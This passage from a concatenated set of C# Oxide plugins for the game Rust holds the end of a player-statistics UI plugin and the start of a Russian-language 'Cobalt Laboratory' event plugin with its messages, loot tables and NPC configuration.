                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"704 {-120 - y * 30}",
                                        OffsetMax = $"822.5 {-95 - y * 30}"
                                    }
                                }
                            });
                        }
                        CuiHelper.AddUi(player, Container);
                    }
                });
            }
            catch (Exception e)
            {
                instance.PrintWarning(e.Message);
            }
        }

        public void SelectPlayer(BasePlayer player)
        {
            try
            {
                CuiElementContainer Container = new CuiElementContainer();
                string ValueName = instance.Name.Replace(".", "");
                var SQLString = Core.Database.Sql.Builder.Append($"SELECT * FROM Stats WHERE steamid='{player.userID}';");
                SQLite.Query(SQLString, SQLiteConnection, obj =>
                {
                    if (obj == null) return;
                    for (int i = 0, y = 12; i < obj.Count; i++, y++)
                    {
                        string color = HexToRustFormat(config.colorConfig.menuContentHighlighting);
                        if (instance.IsEven(y)) color = HexToRustFormat(config.colorConfig.menuContentHighlightingalternative);
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiImageComponent
                                    {
                                        Color = color,
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"77.5 {-120 - y * 30}",
                                        OffsetMax = $"822.5 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.Name.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>Ваша статистика:</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"77.5 {-120 - y * 30}",
                                        OffsetMax = $"190 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.Kills.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["kills"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"193 {-120 - y * 30}",
                                        OffsetMax = $"263 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.Deaths.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["death"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"266 {-120 - y * 30}",
                                        OffsetMax = $"336 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.KillNPC.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["killnpc"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"339 {-120 - y * 30}",
                                        OffsetMax = $"409 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.KillAnimals.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["killanimal"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"412 {-120 - y * 30}",
                                        OffsetMax = $"482 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.MetalOre.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["metalore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"485 {-120 - y * 30}",
                                        OffsetMax = $"555 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.SulfurOre.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["sulfurore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"558 {-120 - y * 30}",
                                        OffsetMax = $"628 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.HQMeta;.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["hqmetalore"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"631 {-120 - y * 30}",
                                        OffsetMax = $"701 {-95 - y * 30}"
                                    }
                                }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Content.Stats.Res.{i}",
                            Parent = MenuContent,
                            Components =
                                {
                                    new CuiTextComponent
                                    {
                                        Text = $"<color={config.colorConfig.menuContentTextAlternative}>{obj.ElementAt(i)["resources"]}</color>",
                                        Align = TextAnchor.MiddleCenter,
                                        FontSize = 14,
                                        Font = "robotocondensed-regular.ttf"
                                    },
                                    new CuiRectTransformComponent
                                    {
                                        AnchorMin = "0 1",
                                        AnchorMax = "0 1",
                                        OffsetMin = $"704 {-120 - y * 30}",
                                        OffsetMax = $"822.5 {-95 - y * 30}"
                                    }
                                }
                        });
                    }
                    CuiHelper.AddUi(player, Container);
                });
            }
            catch (Exception e)
            {
                instance.PrintWarning(e.Message);
            }
        }
        #endregion

        #region Helpers
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }

        private bool IsEven(int a)
        {
            return (a % 2) == 0;
        }
        #endregion
    }
}

// --- End of file: Stats.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/XDCobaltLaboratory.cs ---
// --- Original Local Path: HudRust/XDCobaltLaboratory.cs ---

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Facepunch;
using Network;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using Rust;
using UnityEngine;
using UnityEngine.SceneManagement;
using static NPCPlayerApex;
using Time = UnityEngine.Time;

namespace Oxide.Plugins
{
    [Info("XDCobaltLaboratory", "DezLife", "1.7.3")]
    public class XDCobaltLaboratory : RustPlugin
    {
        /// <summary> - 1.7.0
        /// 1- Хорошо оптимизирован
        /// 2- Обновленно юи, теперь его можно скрывать игрокам которым он мешает.
        /// 3- Подправлен Lang файл
        /// 4- UI можно настроить в конфигурации
        /// 5- Мелкие исправления
        /// 6- Уменьшен шанс спавна постройки на берегу или вводе. Теперь этого не будет.
        /// </summary>
        #region Var
        [PluginReference] Plugin CopyPaste, IQChat, RustMap;
        private static XDCobaltLaboratory _;

        private HashSet<Vector3> busyPoints3D = new HashSet<Vector3>();
        private List<BaseEntity> HouseCobaltLab = new List<BaseEntity>();
        private List<NPCMonitor> nPCMonitors = new List<NPCMonitor>();
        private List<NpcZones> npcZones = new List<NpcZones>();
        private List<UInt64> HideUIUser = new List<UInt64>();
        private string PosIvent;
        private int maxTry = 250000;
        private const int MaxRadius = 5;
        public Timer SpawnHouseTime;
        public Timer RemoveHouseTime;
        public static DateTime TimeCreatedSave = SaveRestore.SaveCreatedTime.Date;
        public static DateTime RealTime = DateTime.Now.Date;
        public static int SaveCreated = RealTime.Subtract(TimeCreatedSave).Days;
        #endregion

        #region Lang
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["XD_IVENT_START"] = "Ученые разбили на этом острове свою лабораторию под названием Кобальт,скорее всего там находится ценные вещи, ведь он охраняется!\nКвадрат : {0}",
                ["XD_IVENT_STARTUI"] = "Ученые разбили свою лабораторию под названием Кобальт!\nКвадрат : {0}",
                ["XD_IVENT_NOPLAYER"] = "Ученые закончили свой эксперимент и успешно покинули остров без происшествий",
                ["XD_IVENT_CRATEHACK"] = "В лаборатории кобальт {0} начал взлом секретного ящика в квадрате {1}\nСоберитесь с силами и отбейте его",
                ["XD_IVENT_CRATEHACKHELP"] = "В лаборатории кобальт {0} начал взлом секретного ящика в квадрате {1}\nСоберитесь с силами и отбейте его\nНа это место уже прибыла подмога! Будте осторожней",
                ["XD_IVENT_CRATEHACKEND"] = "В лаборатории кобальт был взломан секретный ящик, ученые начинают эвакуацию с острова, у вас осталось {0} минут, чтобы забрать его!",
                ["XD_IVENT_CRATELOOTFOUND"] = " В лаборатории кобальт никто не успел залутать взломанный ящик, лаборатория была эвакуирована и постройка разрушена",
                ["XD_IVENT_CRATELOOTPLAYER"] = "{0}  успешно ограбил лабораторию кобальт и забрал ценные вещи с секретного ящика",
                ["XD_IVENT_HOUSECOBALT"] = "Лаборатория КОБАЛЬТ",
                ["XD_IVENT_START_DISCORD"] = "Ученые разбили на этом острове свою лабораторию под названием Кобальт,скорее всего там находится ценные вещи, ведь он охраняется!\nКвадрат : {0}",
                ["XD_IVENT_NOPLAYER_DISCORD"] = "Ученые закончили свой эксперимент и успешно покинули остров без происшествий",
                ["XD_IVENT_CRATEHACK_DISCORD"] = "В лаборатории кобальт {0} начал взлом секретного ящика в квадрате {1}\nСоберитесь с силами и отбейте его",
                ["XD_IVENT_CRATEHACKHELP_DISCORD"] = "В лаборатории кобальт {0} начал взлом секретного ящика в квадрате {1}\nСоберитесь с силами и отбейте его\nНа это место уже прибыла подмога! Будте осторожней",
                ["XD_IVENT_CRATEHACKEND_DISCORD"] = "В лаборатории кобальт был взломан секретный ящик, ученые начинают эвакуацию с острова, у вас осталось {0} минут, чтобы забрать его!",
                ["XD_IVENT_CRATELOOTFOUND_DISCORD"] = " В лаборатории кобальт никто не успел залутать взломанный ящик, лаборатория была эвакуирована и постройка разрушена",
                ["XD_IVENT_CRATELOOTPLAYER_DISCORD"] = "{0}  успешно ограбил лабораторию кобальт и забрал ценные вещи с секретного ящика",
            }, this);
        }

        #endregion

        #region api
        int ApiGetTimeToStart()
        {
            if (SpawnHouseTime.Destroyed)
                return 0;
            int time = (int)(SpawnHouseTime.Delay - DateTime.Now.Second);
            if (time <= 0)
                return 0;
            return time;
        }

        #endregion

        #region Data
        public void LoadDataCopyPaste()
        {
            if (!Interface.Oxide.DataFileSystem.ExistsDatafile("copypaste/HouseCobalt"))
            {
                PrintError($"Файл постройки не найден!\nНачинаем импортировать...");
                webrequest.Enqueue("http://utilite.skyplugins.ru/XDCasinoOutPost/HouseCobaltNew.json", null, (i, s) =>
                {
                    {
                        if (i == 200)
                        {
                            PasteData obj = JsonConvert.DeserializeObject<PasteData>(s);
                            Interface.Oxide.DataFileSystem.WriteObject("copypaste/HouseCobalt", obj);
                            PrintWarning("Постройка успешно загружена");
                        }
                        else
                        {
                            PrintError("Ошибка при загрузке постройки!\nПробуем загрузить еще раз");
                            timer.Once(10f, () => LoadDataCopyPaste());
                            return;
                        }
                    }
                }, this, RequestMethod.GET);
            }
        }
        public class PasteData
        {
            public Dictionary<string, object> @default;
            public ICollection<Dictionary<string, object>> entities;
            public Dictionary<string, object> protocol;
        }
        #endregion

        #region Configuration
        public class LootNpcOrBox
        {
            [JsonProperty("ShortName")]
            public string Shortname;
            [JsonProperty("SkinID")]
            public ulong SkinID;
            [JsonProperty("Имя предмета")]
            public string DisplayName;
            [JsonProperty("Чертеж?")]
            public bool BluePrint;
            [JsonProperty("Минимальное количество")]
            public int MinimalAmount;
            [JsonProperty("максимальное количество")]
            public int MaximumAmount;
            [JsonProperty("Шанс выпадения предмета")]
            public int DropChance;
            [JsonProperty("Умножать этот предмета на день вайпа ?")]
            public bool wipeCheck;
        }
        private static Configuration config = new Configuration();
        private class Configuration
        {

            [JsonProperty("Настройка постройки для ивента (CopyPaste)")]
            public BuildingPasteSettings pasteSettings = new BuildingPasteSettings();
            [JsonProperty("Настройка запуска и остановки ивента")]
            public IventController iventController = new IventController();
            [JsonProperty("Настройка уведомлений")]
            public NotiferSettings notiferSettings = new NotiferSettings();
            [JsonProperty("Настройка радиации в зоне ивента")]
            public RadiationConroller radiationConroller = new RadiationConroller();
            [JsonProperty("Отображения ивента на картах")]
            public MapMarkers mapMarkers = new MapMarkers();
            [JsonProperty("Настройка NPC")]
            public NpcController npcController = new NpcController();
            [JsonProperty("Настройка ящика")]
            public BoxSetting boxSetting = new BoxSetting();

            internal class RadiationConroller
            {
                [JsonProperty("Включить радиацию ?")]
                public bool radUse;
                [JsonProperty("Количество радиационных частиц")]
                public int radCount;
            }

            internal class MapMarkers
            {
                [JsonProperty("Отметить ивент на карте RustMap?")]
                public bool rustMapUse;
                [JsonProperty("Иконка для карты RustMap")]
                public string rustMapIcon;
                [JsonProperty("Текст для карты RustMap")]
                public string rustMapTxt;
                [JsonProperty("Отметить ивент на карте G (Требуется https://umod.org/plugins/marker-manager)")]
                public bool MapUse;
                [JsonProperty("Текст для карты G")]
                public string MapTxt;
            }
            internal class IventController
            {
                [JsonProperty("Минимальное количество игроков для запуска ивента")]
                public int minPlayedPlayers;
                [JsonProperty("Время до начала ивента (Минимальное в секундах)")]
                public int minSpawnIvent;
                [JsonProperty("Время до начала ивента (Максимальное в секундах)")]
                public int maxSpawnIvent;
                [JsonProperty("Время до удаления ивента если никто не откроет ящик (Секунды)")]
                public int timeRemoveHouse;
                [JsonProperty("Время до удаления ивента после того как разблокируется ящик")]
                public int timeRemoveHouse2;
            }
            internal class NpcController
            {
                [JsonProperty("Спавнить NPC вокруг дома ?")]
                public bool useSpawnNPC;
                [JsonProperty("Колличевство NPC")]
                public int countSpawnNpc;
                [JsonProperty("ХП NPC")]
                public int healthNPC;
                [JsonProperty("Дистанция видимости")]
                public int DistanceRange;
                [JsonProperty("Точность оружия ученого (1 - 100)")]
                public int Accuracy;
                [JsonProperty("Спавнить ли подмогу после взлома ящика ? (НПС)")]
                public bool helpBot;
                [JsonProperty("Колличевство нпс (Подмога)")]
                public int helpCount;
                [JsonProperty("Рандомные ники нпс")]
                public List<string> nameNPC = new List<string>();
                [JsonProperty("Одежда для NPC")]
                public List<ItemNpc> wearNpc = new List<ItemNpc>();
                [JsonProperty("Варианты оружия для NPC")]
                public List<ItemNpc> beltNpc = new List<ItemNpc>();
                [JsonProperty("Использовать свой лут в нпс ?")]
                public bool useCustomLoot;
                [JsonProperty("Настройка лута в NPC (Если выключенно то будет стандартный) /cl.botitems")]
                public List<LootNpcOrBox> lootNpcs = new List<LootNpcOrBox>();

                internal class ItemNpc
                {
                    [JsonProperty("ShortName")]
                    public string Shortname;
                    [JsonProperty("SkinID")]
                    public ulong SkinID;
                }
            }

            internal class BuildingPasteSettings
            {
                [JsonProperty("Настройка высоты постройки (Требуется в настройке, если вы хотите ставить свою постройку)")]
                public int heightBuilding;
                [JsonProperty("файл в папке /oxide/data/copypaste с вашей постройкой(Если не указать загрузится стандартная)")]
                public string housepath;
                [JsonProperty("радиус для обнаружения построек игроков")]
                public int radiusClear;
            }

            internal class BoxSetting
            {
                [JsonProperty("Настройка лута в ящике /cl.items")]
                public List<LootNpcOrBox> lootBoxes = new List<LootNpcOrBox>();

                [JsonProperty("Время разблокировки ящика (Сек)")]
                public int unBlockTime;
                [JsonProperty("Макcимальное количество предметов в ящике")]
                public int maxItemCount;
                [JsonProperty("умножать количество лута на количество дней с начала вайпа (на 3й день - лута будет в 3 раза больше)")]
                public bool lootWipePlus;
                [JsonProperty("Включить сигнализацию *?")]
                public bool signaling;
            }
            internal class NotiferSettings
            {
                [JsonProperty("ВебХук дискорда (Если не нужны уведомления в дискорд, оставьте поле пустым)")]
                public string weebHook;
                [JsonProperty("Включить UI Уведомления ?")]
                public bool useUiNotifi;
                [JsonProperty("Цвет заднего фона окна UI")]
                public string colorBackground;
                [JsonProperty("Цвет Кнопки закрытия UI")]
                public string colorBtnCloseUi;
            }

            public static Configuration GetNewConfiguration()
            {
                return new Configuration
                {
                    notiferSettings = new NotiferSettings
                    {
                        weebHook = string.Empty,
                        useUiNotifi = true,
                        colorBackground = "0.8 0.28 0.2 0.8",
                        colorBtnCloseUi = "0.6784314 0.254902 0.1843137 0.8"
                    },
                    pasteSettings = new BuildingPasteSettings
                    {
                        housepath = "",
                        radiusClear = 25,
                        heightBuilding = 2,
                    },
                    iventController = new IventController
                    {
                        minPlayedPlayers = 0,
                        minSpawnIvent = 3000,
                        maxSpawnIvent = 7200,
                        timeRemoveHouse = 900,
                        timeRemoveHouse2 = 300
                    },
                    boxSetting = new BoxSetting
                    {
                        unBlockTime = 900,
                        lootWipePlus = false,
                        maxItemCount = 10,
                        lootBoxes = new List<LootNpcOrBox>
                        {
                           new LootNpcOrBox
                           {
                               Shortname = "pistol.python",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 60,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "multiplegrenadelauncher",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 15,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "sulfur",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 500,
                               MaximumAmount = 800,
                               DropChance = 40,
                               wipeCheck = true
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "gunpowder",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 300,
                               MaximumAmount = 400,
                               DropChance = 10,
                               wipeCheck = true
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "door.hinged.toptier",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = true,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 15,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "wall.external.high.ice",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 5,
                               DropChance = 75,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "ammo.rocket.basic",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 3,
                               DropChance = 25,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "ammo.grenadelauncher.smoke",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 3,
                               MaximumAmount = 10,
                               DropChance = 70,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "ammo.grenadelauncher.he",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 2,
                               MaximumAmount = 5,
                               DropChance = 10,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "metal.facemask",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = true,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 15,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "metal.plate.torso",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = true,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 10,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "clatter.helmet",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 70,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "carburetor3",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 20,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "crankshaft3",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 10,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "techparts",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 5,
                               MaximumAmount = 15,
                               DropChance = 35,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "xmas.lightstring.advanced",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 30,
                               MaximumAmount = 70,
                               DropChance = 45,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "largemedkit",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 3,
                               MaximumAmount = 5,
                               DropChance = 70,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "largemedkit",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = true,
                               MinimalAmount = 3,
                               MaximumAmount = 5,
                               DropChance = 70,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "metal.fragments",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1000,
                               MaximumAmount = 2000,
                               DropChance = 70,
                               wipeCheck = true
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "explosives",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 10,
                               MaximumAmount = 50,
                               DropChance = 30,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "autoturret",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 60,
                               wipeCheck = false
                           },
                           new LootNpcOrBox
                           {
                               Shortname = "explosive.timed",
                               SkinID = 0UL,
                               DisplayName = "",
                               BluePrint = false,
                               MinimalAmount = 1,
                               MaximumAmount = 1,
                               DropChance = 5,
                               wipeCheck = true
                           },
                        },
                        signaling = true
                    },
                    npcController = new NpcController
                    {
                        useSpawnNPC = true,
                        countSpawnNpc = 8,
                        healthNPC = 170,
                        DistanceRange = 140,
                        Accuracy = 40,
                        helpBot = true,
                        helpCount = 4,
                        nameNPC = new List<string> { "Cobalt guard", "Cobalt defense" },
                        wearNpc = new List<NpcController.ItemNpc>
                       {
                           new NpcController.ItemNpc
                           {
                               Shortname = "roadsign.kilt",
                               SkinID = 1121447954
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "burlap.shirt",
                               SkinID = 2076298726
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "shoes.boots",
                               SkinID = 0
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "roadsign.gloves",
                               SkinID = 0
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "burlap.trousers",
                               SkinID = 2076292007
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "metal.facemask",
                               SkinID = 835028125
                           },
                       },
                        beltNpc = new List<NpcController.ItemNpc>
                       {
                           new NpcController.ItemNpc
                           {
                               Shortname = "rifle.lr300",
                               SkinID = 1975712725
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "rifle.lr300",
                               SkinID = 1837473292
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "pistol.semiauto",
                               SkinID = 1557105240
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "rifle.semiauto",
                               SkinID = 1845735432
                           },
                           new NpcController.ItemNpc
                           {
                               Shortname = "rifle.ak",
                               SkinID = 1352726257
              